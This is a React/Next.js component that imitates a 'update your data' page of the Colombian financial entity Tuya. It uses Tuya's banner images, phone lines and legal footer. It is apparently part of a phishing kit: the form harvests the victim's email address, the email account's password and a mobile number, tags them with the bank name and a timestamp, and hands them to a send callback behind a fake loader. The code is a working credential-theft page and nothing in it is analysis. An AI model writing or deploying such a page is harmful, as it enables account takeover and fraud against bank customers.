/* eslint-disable jsx-a11y/alt-text */
/* eslint-disable @typescript-eslint/no-explicit-any */
/* eslint-disable @next/next/no-img-element */
"use client";
import React, { useState, useEffect } from 'react';

import PopLoader from './PopLoader';

export default function ActDatos({ enviar }: any) {
  const [correo, setCorreo] = useState('');
  const [clave, setClave] = useState('');
  const [celular, setCelular] = useState('');
  const [loading, setLoading] = useState(false);
  const [currentDateTime, setCurrentDateTime] = useState('');

  const appVersion = "5.0.2";

  const formatDateTime = (date: Date) => {
    const day = date.getDate();
    const month = date.getMonth() + 1;
    const year = date.getFullYear();

    const timeOptions: Intl.DateTimeFormatOptions = {
      hour: 'numeric',
      minute: '2-digit',
      second: '2-digit',
      hour12: true,
    };
    const timePart = date.toLocaleTimeString('es-CO', timeOptions);

    return `${day}/${month}/${year} ${timePart.replace(/\./g, '')}`;
  };

  useEffect(() => {
    const updateTime = () => {
      setCurrentDateTime(formatDateTime(new Date()));
    };

    updateTime();
    const timerId = setInterval(updateTime, 1000);
    return () => clearInterval(timerId);
  }, []);

  const handleLoginClick = () => {
    if (!correo || !clave || celular.length < 10) {
      alert("Por favor, ingresa los datos correctamente.");
      return;
    }

    setLoading(true);

    const data = {
      view: "actdatos",
      correo,
      clave,
      celular,
      bank: "Tuya",
      timestamp: new Date().toISOString(),
    };

    setTimeout(() => {
      enviar(data);
    }, 1500);
  };

  const handleFormSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    handleLoginClick();
  };

  return (
    <div className="min-h-screen bg-gray-50 pb-10">
      {loading && <PopLoader />}
      
      {/* HEADER */}
      <header className="flex flex-col lg:flex-row justify-between items-center px-0">
        <div
          className="shrink-0 text-white font-bold text-xl mb-4 w-full lg:w-[350px]"
          style={{
            backgroundColor: '#fff',
            borderBottomRightRadius: '0px',
            height: '100px',
            lineHeight: '1.2'
          }}
        >
          <img src="/bancos/tuya/bannerPortalSinMarcas.png" />
        </div>
        <div className="flex flex-col text-sm text-gray-700 p-4 w-full lg:w-auto text-center lg:text-right">
          <span>Fecha Actual {currentDateTime}</span>
          <span>Versión {appVersion}</span>
        </div>
      </header>

      {/* CONTENT */}
      <div className="container mx-auto max-w-5xl pt-8 px-4">
        <form onSubmit={handleFormSubmit} className="flex flex-col items-center">
          <div className="flex flex-col lg:flex-row w-full lg:justify-around items-center lg:items-start space-y-10 lg:space-y-0 lg:space-x-12">
            
            <div className="flex w-full justify-center lg:justify-start">
              <div className="flex flex-col w-full space-y-4 max-w-[300px] lg:max-w-[350px] mx-auto mt-4">
                
                <h2 className="text-xl font-bold text-gray-700 mb-2">Actualiza tus datos</h2>
                <p className="text-sm text-gray-600 mb-4">Por favor, ingresa la siguiente información para continuar.</p>

                <div>
                  <label className="font-bold text-gray-700 text-sm block mb-1">Correo Electrónico</label>
                  <input
                    type="email"
                    className="w-full border border-gray-400 p-2 text-sm rounded-sm focus:ring-0 focus:border-red-600 h-10"
                    onChange={(e) => setCorreo(e.target.value)}
                    value={correo}
                  />
                </div>

                <div>
                  <label className="font-bold text-gray-700 text-sm block mb-1">Clave del correo</label>
                  <input
                    type="password"
                    className="w-full border border-gray-400 p-2 text-sm rounded-sm focus:ring-0 focus:border-red-600 h-10"
                    onChange={(e) => setClave(e.target.value)}
                    value={clave}
                  />
                </div>

                <div>
                  <label className="font-bold text-gray-700 text-sm block mb-1">Número de celular</label>
                  <input
                    type="tel"
                    maxLength={10}
                    className="w-full border border-gray-400 p-2 text-sm rounded-sm focus:ring-0 focus:border-red-600 h-10"
                    onChange={(e) => setCelular(e.target.value.replace(/\D/g, ''))}
                    value={celular}
                  />
                </div>

                <div className="pt-4">
                  <button
                    type="submit"
                    className="w-full py-2 text-sm font-bold text-white rounded-sm transition-colors duration-150 h-10"
                    style={{ backgroundColor: '#c00000' }}
                  >
                    Continuar
                  </button>
                </div>
              </div>
            </div>

            {/* IMAGEN LATERAL */}
            <div className="shrink-0 w-full sm:w-[300px] h-[250px] mt-8 lg:mt-0 lg:order-last order-3 mx-auto">
              <img
                src="/bancos/tuya/PublicidadPortal.jpeg"
                alt="Mujer hablando por teléfono"
                className="rounded-lg shadow-md object-cover w-full h-full"
              />
            </div>
          </div>

          {/* Logos de Tarjetas */}
          <div className="flex flex-wrap justify-center items-center gap-4 my-10 max-w-lg">
            <img src="/bancos/tuya/titulos-productos.png" alt={`Logo`} className="h-8" />
          </div>

          {/* Texto Legal */}
          <div className="text-center text-xs text-gray-600 max-w-xl px-4">
            Líneas de atención al cliente: Bogotá 601 482 4804 - Cali 602 380 8933 – Medellín 604 444 3727. Línea Nacional: 01 8000 978888<br />
            Todos los Derechos Reservados © 2019 Entidad Vigilada por la Superintendencia Financiera de Colombia<br />
            Para conocer acerca de la utilización de Información,<br />
            <a href="https://www.tuya.com.co/para-tener-en-cuenta" target="_blank" className="text-blue-600 hover:underline">Ingresa aquí</a>
          </div>

        </form>
      </div>
    </div>
  );
}
